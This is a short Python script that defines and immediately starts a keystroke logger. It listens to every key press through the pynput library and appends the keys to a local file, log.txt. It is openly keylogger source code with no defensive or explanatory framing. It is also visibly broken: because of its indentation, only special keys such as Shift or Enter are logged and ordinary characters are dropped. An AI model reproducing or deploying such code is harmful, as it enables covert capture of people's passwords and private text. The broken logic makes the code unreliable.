import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):
        self.logger = ""
    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        with open ("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)
        #print(self.logger)
        self.logger = ""

    def evaluate_keys(self, key):
        try:
            Pressed_Key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_Key = " "
            else:
                Pressed_Key = " " + str(key) + " "
            self.append_to_log(Pressed_Key)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

SimpleKeyLogger().start() 